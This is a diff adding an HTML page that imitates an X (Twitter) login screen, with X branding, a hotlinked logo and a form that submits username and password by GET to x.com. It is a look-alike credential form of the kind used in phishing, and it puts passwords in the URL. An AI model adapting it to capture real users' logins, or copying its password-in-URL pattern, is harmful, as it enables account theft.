@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<!-- 
+  made by
+   /$$                                                      /$$$$$$                      /$$    
+  | $$                                                     /$$__  $$                    | $$    
+ /$$$$$$    /$$$$$$  /$$$$$$/$$$$  /$$$$$$/$$$$  /$$   /$$| $$  \__//$$$$$$   /$$$$$$  /$$$$$$  
+|_  $$_/   /$$__  $$| $$_  $$_  $$| $$_  $$_  $$| $$  | $$| $$$$   |____  $$ /$$__  $$|_  $$_/  
+  | $$    | $$  \ $$| $$ \ $$ \ $$| $$ \ $$ \ $$| $$  | $$| $$_/    /$$$$$$$| $$  \__/  | $$    
+  | $$ /$$| $$  | $$| $$ | $$ | $$| $$ | $$ | $$| $$  | $$| $$     /$$__  $$| $$        | $$ /$$
+  |  $$$$/|  $$$$$$/| $$ | $$ | $$| $$ | $$ | $$|  $$$$$$$| $$    |  $$$$$$$| $$        |  $$$$/
+   \___/   \______/ |__/ |__/ |__/|__/ |__/ |__/ \____  $$|__/     \_______/|__/         \___/  
+                                                 /$$  | $$                                      
+                                                |  $$$$$$/                                      
+                                                 \______/                                       
+-->
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login with X</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f8fa; 
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin-bottom: 15px;
+        }
+
+        h2 {
+            text-align: center;
+            font-size: 24px;
+            color: #1DA1F2;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccd6dd;
+            border-radius: 30px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1DA1F2;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 30px;
+            background-color: #1DA1F2;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .submit-btn:hover {
+            background-color: #1991d0;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .forgot-password a {
+            color: #1DA1F2;
+            text-decoration: none;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- X logo -->
+        <div class="logo-container">
+            <img src="https://img.freepik.com/premium-vector/twitter-new-x-logo-vector_768467-92.jpg" alt="X Logo" class="logo">
+        </div>
+
+        <h2>Login with X</h2>
+
+        <!-- Login form -->
+        <form action="https://x.com" method="get">
+            <input type="text" class="input-field" name="username" placeholder="Username" required>
+            <input type="password" class="input-field" name="password" placeholder="Password" required>
+
+            <button type="submit" class="submit-btn">Login with X</button>
+        </form>
+
+        <!-- Forgot password link -->
+        <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+        </div>
+    </div>
+
+</body>
+</html>
